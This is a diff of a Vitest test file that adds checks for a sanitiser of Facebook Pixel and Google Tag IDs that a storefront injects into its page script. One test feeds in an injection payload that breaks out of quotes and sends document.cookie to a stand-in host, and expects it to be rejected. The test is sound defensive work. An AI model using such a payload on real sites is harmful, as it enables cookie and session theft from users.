@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest'
-import { validarGoogleTag, validarPixelFacebook } from './pixels'
+import { idsDeMedicaoSeguros, validarGoogleTag, validarPixelFacebook } from './pixels'
 
 describe('IDs de medição', () => {
   it('Facebook Pixel: só números, 15–16 dígitos, espaços tirados', () => {
@@ -19,5 +19,22 @@ describe('IDs de medição', () => {
     expect(validarGoogleTag('UA-12345-1').ok).toBe(false)
     expect(validarGoogleTag('G-').ok).toBe(false)
     expect(validarGoogleTag('ABC').ok).toBe(false)
+  })
+})
+
+describe('idsDeMedicaoSeguros (o que a vitrine injeta no script)', () => {
+  it('ID válido passa (sem espaços); ID antigo fora do padrão da tela continua (AW-, UA-)', () => {
+    expect(idsDeMedicaoSeguros(' 1234567890 12345 ', 'G-ABC123DEF')).toEqual({ pixelId: '123456789012345', tagId: 'G-ABC123DEF' })
+    expect(idsDeMedicaoSeguros('12345678901234', 'AW-123456789')).toEqual({ pixelId: '12345678901234', tagId: 'AW-123456789' })
+    expect(idsDeMedicaoSeguros(null, 'UA-1234567-1').tagId).toBe('UA-1234567-1')
+  })
+
+  it('valor com aspas/código nunca chega ao script', () => {
+    const r = idsDeMedicaoSeguros("');fetch('https://x/?c='+document.cookie);('", "G-1');alert(1);('")
+    expect(r).toEqual({ pixelId: null, tagId: null })
+  })
+
+  it('vazio fica vazio', () => {
+    expect(idsDeMedicaoSeguros(null, '')).toEqual({ pixelId: null, tagId: null })
   })
 })
